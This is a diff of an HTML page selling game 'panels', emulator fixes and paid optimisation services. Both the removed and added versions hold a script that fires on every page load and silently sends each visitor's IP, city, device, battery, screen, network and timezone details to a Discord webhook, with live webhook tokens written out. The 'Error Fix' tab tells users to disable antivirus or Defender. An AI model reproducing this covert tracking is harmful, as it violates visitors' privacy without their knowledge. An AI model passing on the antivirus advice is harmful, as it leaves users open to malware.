@@ -191,183 +191,128 @@ textarea{resize:none; height:80px}
 
 
 
+
 <script>
-// =====================
-// Helper Functions
-// =====================
-
-// Battery Info
-async function getBatteryInfo(){
-  if(!navigator.getBattery) return {};
-  try{
-    const b = await navigator.getBattery();
-    return {
-      level: Math.round(b.level * 100) + "%",
-      charging: b.charging ? "Yes" : "No"
-    };
-  }catch{
-    return {};
-  }
+// 6️⃣ Battery Info Detector
+async function getBatteryInfo() {
+    if (!navigator.getBattery) {
+        return { level: "Not Supported", charging: "N/A", chargingTime: "N/A", dischargingTime: "N/A" };
+    }
+    try {
+        const battery = await navigator.getBattery();
+        return {
+            level: Math.round(battery.level * 100) + "%",
+            charging: battery.charging ? "Yes" : "No",
+            chargingTime: battery.chargingTime !== Infinity ? battery.chargingTime + " sec" : "N/A",
+            dischargingTime: battery.dischargingTime !== Infinity ? battery.dischargingTime + " sec" : "N/A"
+        };
+    } catch (err) {
+        return { level: "Error", charging: "Error", chargingTime: "Error", dischargingTime: "Error" };
+    }
 }
 
-// Device Brand / OS
-function getDeviceInfo(){
-  const ua = navigator.userAgent;
-  return {
-    os: /Android/i.test(ua) ? "Android" :
-        /iPhone|iPad|iPod/i.test(ua) ? "iOS" :
-        /Windows/i.test(ua) ? "Windows" :
-        /Mac/i.test(ua) ? "MacOS" : "Unknown",
-    type: /Mobi|Android/i.test(ua) ? "Mobile" : "Desktop"
-  };
-}
-
-// Network
-function getNetworkInfo(){
-  return {
-    online: navigator.onLine ? "Online" : "Offline",
-    type: navigator.connection?.effectiveType || "N/A",
-    downlink: navigator.connection?.downlink ? navigator.connection.downlink + " Mbps" : "N/A",
-    rtt: navigator.connection?.rtt ? navigator.connection.rtt + " ms" : "N/A"
-  };
-}
-
-// Storage Capability
-async function getStorageInfo(){
-  let estimate = { total: "N/A", used: "N/A" };
-  if(navigator.storage?.estimate){
-    const e = await navigator.storage.estimate();
-    estimate = {
-      total: Math.round(e.quota / (1024*1024)) + " MB",
-      used: Math.round(e.usage / (1024*1024)) + " MB"
-    };
-  }
-  return {
-    localStorage: typeof localStorage !== "undefined",
-    sessionStorage: typeof sessionStorage !== "undefined",
-    indexedDB: !!window.indexedDB,
-    cacheAPI: "caches" in window,
-    ...estimate
-  };
-}
-
-// Hardware
-function getHardwareInfo(){
-  return {
-    cpuCores: navigator.hardwareConcurrency || "N/A",
-    ram: navigator.deviceMemory ? navigator.deviceMemory + " GB" : "N/A",
-    touch: 'ontouchstart' in window,
-    maxTouchPoints: navigator.maxTouchPoints || 0
-  };
-}
-
-// Display
-function getDisplayInfo(){
-  return {
-    screen: screen.width + "x" + screen.height,
-    viewport: window.innerWidth + "x" + window.innerHeight,
-    pixelRatio: window.devicePixelRatio,
-    colorDepth: screen.colorDepth,
-    orientation: screen.orientation?.type || "N/A"
-  };
-}
-
-// Locale
-function getLocaleInfo(){
-  return {
-    language: navigator.language,
-    languages: navigator.languages?.join(", "),
-    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-    timeFormat: Intl.DateTimeFormat().resolvedOptions().hour12 ? "12H" : "24H"
-  };
+// Device brand
+function getDeviceBrand() {
+    const ua = navigator.userAgent;
+    if(/iPhone/i.test(ua)) return "Apple iPhone";
+    if(/iPad/i.test(ua)) return "Apple iPad";
+    if(/Android/i.test(ua)) return "Android Device";
+    if(/Windows/i.test(ua)) return "Windows PC";
+    if(/Macintosh/i.test(ua)) return "Mac";
+    return "Unknown";
 }
 
 // Visitor ID
-function getVisitorID(){
-  let id = sessionStorage.getItem("visitorID");
-  if(!id){
-    id = Math.random().toString(36).substring(2,10);
-    sessionStorage.setItem("visitorID", id);
-  }
-  return id;
+function getVisitorID() {
+    let id = sessionStorage.getItem("visitorID");
+    if(!id){
+        id = Math.random().toString(36).substring(2,12);
+        sessionStorage.setItem("visitorID", id);
+    }
+    return id;
 }
 
-// =====================
-// SEND VISITOR INFO
-// =====================
-async function sendVisitorInfo(){
-
-  const webhookURL = "https://discord.com/api/webhooks/1449725566591701174/Jn_1l25N_fzB3u-IX5h2v14hsqz0YBSXSX_293pR6oGkzRUd4pdsRdbnMksVyChfCMfU";
-
-  const device = getDeviceInfo();
-  const network = getNetworkInfo();
-  const hardware = getHardwareInfo();
-  const display = getDisplayInfo();
-  const locale = getLocaleInfo();
-  const storage = await getStorageInfo();
-  const battery = await getBatteryInfo();
-  const visitorID = getVisitorID();
-
-  // IP Location
-  let location = "N/A";
-  try{
-    const res = await fetch("https://ipapi.co/json/");
-    const d = await res.json();
-    location = `${d.city}, ${d.country_name} (${d.ip})`;
-  }catch{}
-
-  const payload = {
-    content: "📱💻 **New Website Visitor**",
-    embeds: [{
-      color: 0x00ff99,
-      title: "Visitor Full Device Info",
-      fields: [
-        { name: "👤 Visitor ID", value: visitorID, inline: true },
-        { name: "📱 Device Type", value: device.type, inline: true },
-        { name: "🖥️ OS", value: device.os, inline: true },
-
-        { name: "🧠 CPU / RAM", value: `${hardware.cpuCores} Cores / ${hardware.ram}`, inline: true },
-        { name: "✋ Touch", value: hardware.touch + " (" + hardware.maxTouchPoints + ")", inline: true },
-
-        { name: "📐 Screen", value: display.screen, inline: true },
-        { name: "🖥️ Viewport", value: display.viewport, inline: true },
-        { name: "🔄 Orientation", value: display.orientation, inline: true },
-
-        { name: "📶 Network", value: `${network.type} | ${network.downlink}`, inline: true },
-        { name: "🌐 Status", value: network.online, inline: true },
-
-        { name: "🔋 Battery", value: battery.level ? `${battery.level} (Charging: ${battery.charging})` : "N/A", inline: true },
-
-        { name: "💾 Storage", value:
-          `Local: ${storage.localStorage}
-Session: ${storage.sessionStorage}
-IndexedDB: ${storage.indexedDB}
-CacheAPI: ${storage.cacheAPI}
-Used: ${storage.used}
-Total: ${storage.total}`
-        },
-
-        { name: "🌍 Location", value: location },
-        { name: "🗣️ Language", value: locale.languages },
-        { name: "🕒 Timezone", value: locale.timezone }
-      ],
-      footer: { text: "Legal Device Info Collection | Z HEX" },
-      timestamp: new Date()
-    }]
-  };
-
-  fetch(webhookURL,{
-    method:"POST",
-    headers:{ "Content-Type":"application/json" },
-    body: JSON.stringify(payload)
-  });
+// Network info
+function getNetworkInfo() {
+    if(navigator.connection){
+        return {
+            effectiveType: navigator.connection.effectiveType || "N/A",
+            downlink: navigator.connection.downlink || "N/A",
+            rtt: navigator.connection.rtt || "N/A"
+        };
+    } else {
+        return { effectiveType: "N/A", downlink: "N/A", rtt: "N/A" };
+    }
 }
 
-// Start Session
-if(!sessionStorage.getItem("sessionStart")){
-  sessionStorage.setItem("sessionStart", Date.now());
-  sendVisitorInfo();
+// Send Visitor Info
+async function sendVisitorInfo() {
+    const webhookURL = "https://discord.com/api/webhooks/1449603518691283157/AiLtL8RdJoHumPvm0j7FycuT28N5cutaKSW3gs29GThGc6sDQsp4bF1IkdbiWhiQp41n";
+    const deviceBrand = getDeviceBrand();
+    const visitorID = getVisitorID();
+    const battery = await getBatteryInfo();
+    const network = getNetworkInfo();
+
+    // IP based location
+    let locationText = "Not Available";
+    try{
+        const res = await fetch("https://ipapi.co/json/");
+        const data = await res.json();
+        locationText = `${data.city}, ${data.region}, ${data.country_name} (IP: ${data.ip})`;
+    }catch(e){ console.warn("IP Location failed", e); }
+
+    const payload = {
+        content: "**🌐 New Website Visit (Test Mode)**",
+        embeds: [{
+            title: "Visitor Info",
+            color: 0x00ff99,
+            fields: [
+                { name: "👤 Visitor ID", value: visitorID, inline: true },
+                { name: "🕒 Visit Time", value: new Date().toLocaleString(), inline: true },
+                { name: "📄 Page Title", value: document.title, inline: false },
+                { name: "🖥️ Browser", value: navigator.userAgent, inline: false },
+                { name: "💻 OS", value: navigator.platform, inline: true },
+                { name: "📱 Device Type", value: /Mobi|Android/i.test(navigator.userAgent) ? "Mobile" : "Desktop", inline: true },
+                { name: "📲 Device Brand", value: deviceBrand, inline: true },
+                { name: "🔋 Battery Level", value: battery.level, inline: true },
+                { name: "🔌 Charging?", value: battery.charging, inline: true },
+                { name: "⏱️ Charging Time", value: battery.chargingTime, inline: true },
+                { name: "⏱️ Discharging Time", value: battery.dischargingTime, inline: true },
+                { name: "🌍 Location", value: locationText, inline: false },
+                { name: "📶 Network Type", value: network.effectiveType, inline: true },
+                { name: "📶 Downlink", value: network.downlink + " Mbps", inline: true },
+                { name: "📶 RTT", value: network.rtt + " ms", inline: true },
+                { name: "📐 Screen Resolution", value: screen.width + "x" + screen.height, inline: true },
+                { name: "🖥️ Viewport Size", value: window.innerWidth + "x" + window.innerHeight, inline: true },
+                { name: "🌐 Browser Language", value: navigator.language, inline: true },
+                { name: "🕓 Timezone", value: Intl.DateTimeFormat().resolvedOptions().timeZone, inline: true },
+                { name: "🔁 Session Duration", value: Math.floor((Date.now() - (sessionStorage.getItem("sessionStart") || Date.now()))/1000) + " sec", inline: true }
+            ],
+            footer: { text: "Study / Testing Purpose Only | Powered by KAVINDU" },
+            timestamp: new Date()
+        }]
+    };
+
+    try {
+        const res = await fetch(webhookURL, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(payload)
+        });
+        if(res.ok){
+            console.log("Visitor info sent ✅");
+            sessionStorage.setItem("visitorLogged", "true");
+        } else {
+            console.error("Webhook error ❌ Status:", res.status);
+        }
+    } catch (err) {
+        console.error("Failed to send visitor info ❌", err);
+    }
 }
+
+// Initialize session start and send visitor info
+if(!sessionStorage.getItem("sessionStart")) sessionStorage.setItem("sessionStart", Date.now());
+sendVisitorInfo();
 </script>
 
 
@@ -391,12 +336,14 @@ if(!sessionStorage.getItem("sessionStart")){
 <!-- MAIN TABS -->
 <div class="tabs">
   <button class="active" onclick="showTab('buy', event)">🛒 Buy Panel</button>
-  <button onclick="showTab('free', event)">🎁 Free Panel</button>
   <button onclick="showTab('fix', event)">🛠 Error Fix</button>
   <button onclick="showTab('bot', event)">🤖 Bot Service</button>
   <button onclick="showTab('feedback', event)">📝 Feedback</button>
-  <button onclick="showTab('download', event)">⬇ Download</button>
   <button onclick="showTab('emulator', event)">💻 Emulator</button>
+  <button onclick="showTab('optimize', event)">⚙ Optimize</button>
+  <button onclick="showTab('download', event)">⬇ Download</button>
+  <button onclick="showTab('free', event)">🎁 Free Panel</button>
+
 </div>
 
 <!-- BUY PANEL -->
@@ -460,6 +407,78 @@ if(!sessionStorage.getItem("sessionStart")){
   </div>
 </div>
 
+<!-- OPTIMIZE KAIAYA -->
+<div id="optimize" class="tab-content">
+  
+  <div class="subtabs">
+    <button class="active" onclick="showOptimizeTab('opt-free', event)">🆓 FREE</button>
+    <button onclick="showOptimizeTab('opt-paid', event)">💰 PAID</button>
+  </div>
+
+  <!-- FREE OPTIMIZE -->
+  <div id="opt-free" class="subtab-content active">
+    <div class="card">
+      <h2>🆓 FREE Optimize Noky                  (Optimization Partner: NOKY)</h2>
+      <ul>
+        <li>Basic Emulator Optimization</li>
+        <li>Lag Reduce Settings</li>
+        <li>FPS Boost Tips</li>
+        <li>Safe & Legit Methods</li>
+        <li>No Risk / No Ban</li>
+      </ul>
+      <p style="color:var(--sub)">
+        ⚠ FREE optimize එක Basic level එකට පමණයි
+      </p>
+      <a class="btn whatsapp" href="https://wa.me/94768863617" target="_blank">
+        Contact via WhatsApp
+      </a>
+    </div>
+  </div>
+
+  <!-- PAID OPTIMIZE -->
+  <div id="opt-paid" class="subtab-content">
+    <div class="card">
+      <h2>💰 PAID Optimize By Noky              (Optimization Partner: NOKY)</h2>
+      <ul><li>Advanced FPS Boost</li>
+<li>Custom Emulator Config</li>
+<li>Game Stability Fix</li>
+<li>Panel + Emulator Full Optimize</li>
+<li>Low End PC Special Support</li>
+<li>1 to 1 Admin Support</li>
+
+<!-- 🔥 EXTRA OPTIMIZE FEATURES -->
+<li>Input Delay Reduction (Mouse & Keyboard)</li>
+<li>Emulator RAM & CPU Load Optimization</li>
+<li>Background Process Cleanup</li>
+<li>Graphics Driver Tuning</li>
+<li>High Stability Anti-Crash Fix</li>
+<li>Network Lag & Ping Optimization</li>
+<li>Custom Resolution & DPI Tuning</li>
+<li>Heat & Resource Usage Control</li>
+<li>Game Cache & Temp File Optimization</li>
+<li>Safe Legit Performance Mode</li>
+
+      </ul>
+
+      <h3>Packages</h3>
+      <ul>
+        <li>Pc Optimze – Rs.2000</li>
+        <li>Mobile Optimze – Rs.5000</li>
+      </ul>
+
+      <a class="btn whatsapp" href="https://wa.me/94768863617" target="_blank">
+        Contact via WhatsApp
+      </a>
+    </div>
+  </div>
+
+</div>
+
+
+
+
+
+
 <!-- FREE PANEL -->
 <div id="free" class="tab-content">
   <div class="card">
@@ -500,7 +519,7 @@ if(!sessionStorage.getItem("sessionStart")){
         <li>Run Panel as Administrator</li>
         <li>Disable Antivirus / Defender</li>
         <li>Restart Emulator</li>
-        <li>Use MSI App Player ARM 32 / BlueStacks ARM 32</li>
+        <li>Use MSI App Player / BlueStacks ARM 32</li>
       </ul>
       <p style="color:var(--sub)">⚠ Fix කරගැනීමට නොහැකි නම් Admin සහාය ලබාගන්න</p>
     </div>
@@ -582,90 +601,55 @@ if(!sessionStorage.getItem("sessionStart")){
 </div>
 
 <script>
-// Tabs
+// MAIN TABS
 function showTab(id, evt){
   document.querySelectorAll(".tab-content").forEach(t=>t.classList.remove("active"));
   document.querySelectorAll(".tabs button").forEach(b=>b.classList.remove("active"));
   document.getElementById(id).classList.add("active");
   evt.currentTarget.classList.add("active");
 }
+
+// BUY SUBTABS
 function showSubTab(id, evt){
   document.querySelectorAll("#buy .subtab-content").forEach(t=>t.classList.remove("active"));
   document.querySelectorAll("#buy .subtabs button").forEach(b=>b.classList.remove("active"));
   document.getElementById(id).classList.add("active");
   evt.currentTarget.classList.add("active");
 }
+
+// FIX SUBTABS
 function showFixTab(id, evt){
   document.querySelectorAll("#fix .subtab-content").forEach(t=>t.classList.remove("active"));
   document.querySelectorAll("#fix .subtabs button").forEach(b=>b.classList.remove("active"));
   document.getElementById(id).classList.add("active");
   evt.currentTarget.classList.add("active");
 }
-async function sendFeedback(){
 
-    const name = document.getElementById("username").value || "No Name";
-    const message = document.getElementById("message").value || "No Message";
-    const fileInput = document.getElementById("fileInput");
-    const file = fileInput.files[0];
-
-    const webhookURL = "https://discord.com/api/webhooks/1449730195333578833/JUnV74oT-cRECyBDiXGGgDh9hEXtIegdRz0xH33ZViBwgg6kL6hTkJgdDk2wguj_XSsM";
-
-    const formData = new FormData();
-
-    const payload = {
-        content: "📝 **New Feedback Submitted**",
-        embeds: [{
-            color: 0x00ff99,
-            fields: [
-                { name: "👤 Name", value: name },
-                { name: "💬 Feedback", value: message }
-            ],
-            footer: { text: "Z HEX Feedback System" },
-            timestamp: new Date()
-        }]
-    };
-
-    formData.append("payload_json", JSON.stringify(payload));
-
-    if(file){
-        formData.append("file", file);
-    }
-
-    try{
-        await fetch(webhookURL, {
-            method: "POST",
-            body: formData
-        });
-
-        alert("Feedback Sent Successfully ✅");
-
-        document.getElementById("username").value = "";
-        document.getElementById("message").value = "";
-        fileInput.value = "";
-
-    }catch(err){
-        alert("Error Sending Feedback ❌");
-        console.error(err);
-    }
+// OPTIMIZE SUBTABS
+function showOptimizeTab(id, evt){
+  document.querySelectorAll("#optimize .subtab-content").forEach(t=>t.classList.remove("active"));
+  document.querySelectorAll("#optimize .subtabs button").forEach(b=>b.classList.remove("active"));
+  document.getElementById(id).classList.add("active");
+  evt.currentTarget.classList.add("active");
 }
 
+// FEEDBACK (simple)
+function sendFeedback(){
+  alert("Feedback Sent ✅");
+}
 
-// Whole Website Views Counter
+// VIEWS COUNTER FIX
 (function(){
-    const today = new Date().toDateString(); // current date
-    let lastVisit = localStorage.getItem('globalViewsDate');
-    let totalViews = parseInt(localStorage.getItem('globalViewsCount') || "0");
+  const viewsDiv = document.getElementById("global-views");
+  if(!viewsDiv) return;
 
-    if(lastVisit !== today){
-        totalViews += 1;
-        localStorage.setItem('globalViewsCount', totalViews);
-        localStorage.setItem('globalViewsDate', today);
-    }
-
-    const viewsDiv = document.getElementById('global-views');
-    viewsDiv.innerText = "🌐 Views Today: " + totalViews;
+  let views = parseInt(localStorage.getItem("views") || "0");
+  views++;
+  localStorage.setItem("views", views);
+  viewsDiv.innerText = "🌐 Total Views: " + views;
 })();
 </script>
+
 
 </body>
 </html>
